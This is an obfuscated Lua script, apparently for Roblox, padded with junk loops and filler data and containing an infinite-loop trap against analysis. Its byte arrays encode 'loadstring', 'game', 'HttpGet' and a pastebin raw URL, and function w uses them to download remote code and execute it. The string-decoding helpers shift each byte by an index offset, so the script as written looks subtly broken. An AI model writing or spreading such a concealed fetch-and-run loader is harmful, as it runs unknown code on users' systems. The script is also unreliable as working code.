local _ = "Obfuscated by Dylan"
local function x(n) local r = 1 for i = 1, n do r = (r * 1103515245 + 12345) % 2^31 end return r end
local function g(s, c) local t = {}; for i = 1, #s do local b = (s:byte(i) + c + i*7) % 256; t[i] = string.char(b) end; return table.concat(t) end
local function h(s) return (s:gsub(".", function(b) return "\\" .. b:byte() end)) end
local a = x(42)
local b = x(a % 1000)
local function c() local q = 0; for i = 1, 10000 do q = q + math.sin(i) * math.cos(i) end return q end
local d = c()
local e = x(b % 500 + 1)
local f = {}
for i = 1, 4000 do f[i] = string.char(65 + (i % 26)) end
local k = table.concat(f)
local function m() if rawget(_G, "loadstring") == nil then while true do end end end
m()
local u = {
	108,111,97,100,115,116,114,105,110,103,
	103,97,109,101,
	72,116,116,112,71,101,116,
	104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,48,118,104,76,120,66,117,112
}
local function p(t, off)
	local r = {}
	for i, v in ipairs(t) do
		local byte = (v + off + i * 3) % 256
		r[i] = string.char(byte)
	end
	return table.concat(r)
end
local function q(t, off)
	local r = {}
	for i, v in ipairs(t) do
		local byte = (v - off - i * 3) % 256
		r[i] = string.char(byte)
	end
	return table.concat(r)
end
local r = q(u, 0)
local s = {}
local v = 0
for i = 1, 500000 do v = v + math.sin(i) end
s[1] = p({108,111,97,100,115,116,114,105,110,103}, 0)
s[2] = p({103,97,109,101}, 0)
s[3] = p({72,116,116,112,71,101,116}, 0)
s[4] = q(u, 0)
local function w()
	local L = _G[s[1]]
	local G = _G[s[2]]
	local H = G[s[3]]
	local U = s[4]
	local C = H(G, U)
	local F = L(C)
	if F then F() end
end
local _trace = {}
for i = 1, 900 do _trace[i] = function() return i end end
local _sum = 0
for i = 1, 900 do _sum = _sum + _trace[i]() end
w()
local _clean = {}
for i = 1, 1000 do _clean[i] = i * i - i end
